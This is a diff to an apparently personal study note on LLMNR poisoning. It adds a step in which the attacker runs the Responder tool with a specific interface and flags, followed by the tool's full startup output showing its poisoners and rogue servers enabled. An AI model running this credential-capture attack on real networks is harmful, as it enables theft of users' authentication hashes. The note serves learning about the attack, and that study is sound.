@@ -10,7 +10,83 @@ In this attacker tricks a computer on a local network into sending sensitive inf
 
 ## [How does it work?]()
 
--  **LLMNR request**: When a computer on the network cannot resolve a hostname (e.g., "FileServer") via DNS, it broadcasts an LLMNR request, asking: _"Does anyone here know the IP for 'FileServer'?"_
+- Attacker starts responder with below command. Responder listens on client requests and respond saying it has the resource client is asking. 
+
+```
+┌─[✗]─[hexadivine@parrot]─[~]
+└──╼ $ sudo responder -I wlp0s20f3 -Pwd
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -> https://www.patreon.com/PythonResponder
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [ON]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [ON]
+    Auth proxy                 [ON]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [wlp0s20f3]
+    Responder IP               [192.168.0.105]
+    Responder IPv6             [fe80::7635:bf9e:3643:497f]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-QMUVSR50L9S]
+    Responder Domain Name      [UJW2.LOCAL]
+    Responder DCE-RPC Port     [46659]
+
+[+] Listening for events...
+
+[*] [DHCP] Found DHCP server IP: 192.168.0.1, now waiting for incoming requests...
+```
+
+- **LLMNR request**: When a computer on the network cannot resolve a hostname (e.g., "FileServer") via DNS, it broadcasts an LLMNR request, asking: _"Does anyone here know the IP for 'FileServer'?"_
 
 ![](assets/Pasted%20image%2020241216165512.png)
 
@@ -26,6 +102,3 @@ In this attacker tricks a computer on a local network into sending sensitive inf
 
 ![](assets/Pasted%20image%2020241216170234.png)
 
-## [Responder]()
-
-- Responder listens on client requests and respond saying it has the resource client is asking. 
